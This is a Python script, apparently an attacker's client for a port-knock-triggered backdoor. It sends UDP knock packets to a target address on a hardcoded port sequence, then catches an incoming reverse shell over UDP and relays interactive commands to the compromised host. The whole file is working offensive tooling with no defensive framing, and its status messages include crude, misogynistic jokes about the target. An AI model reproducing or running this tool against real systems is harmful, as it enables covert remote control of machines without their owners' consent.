#!/usr/bin/python

# Reverse Portknock-Activated UDP Shell Spawner
# (C) 2013 jtRIPper
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 1, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

import socket
import time
import threading
import sys
import readline
readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')

ports       = (4572, 1337, 8928, 29430)
listen_port = 1234
wait_time   = 2

def magic_packets():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  for port in ports + (listen_port, ):
    time.sleep(wait_time)
    sys.stdout.write(".")
    sys.stdout.flush()
    s.sendto("dicks", (sys.argv[1], port))
  print ""
  s.close()

def receive_loop(s):
  while True:
    try:
      output, addr = s.recvfrom(10000)
      print output.rstrip()
    except socket.error:
      return

def shell_handler():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.bind(("", listen_port))

  output, addr = s.recvfrom(1024)
  print " [*] Received shell from %s:%d" % (addr[0], addr[1])
  receive_thread = threading.Thread(target=receive_loop, args=(s,))
  receive_thread.start()

  for cmd in ("id", "uname -a"):
    s.sendto(cmd + "\n", addr)

  while True:
    try:
      cmd = raw_input("") + "\n"
      if cmd == "exit\n": break
      s.sendto(cmd, addr)
    except KeyboardInterrupt:
      break

  s.sendto("exit\n", addr)
  s.close()
  receive_thread._Thread__stop()

if len(sys.argv) != 2:
  print "Usage: %s <ip address>" % sys.argv[0]
  exit()

sys.stdout.write(" [*] Opening %s up like a cheap hooker please wait %d seconds" % (sys.argv[1], (len(ports) + 1) * wait_time))
sys.stdout.flush()

threading.Thread(target=magic_packets).start()
shell_handler()
print " [*] Shell exiting, hope you had fun."

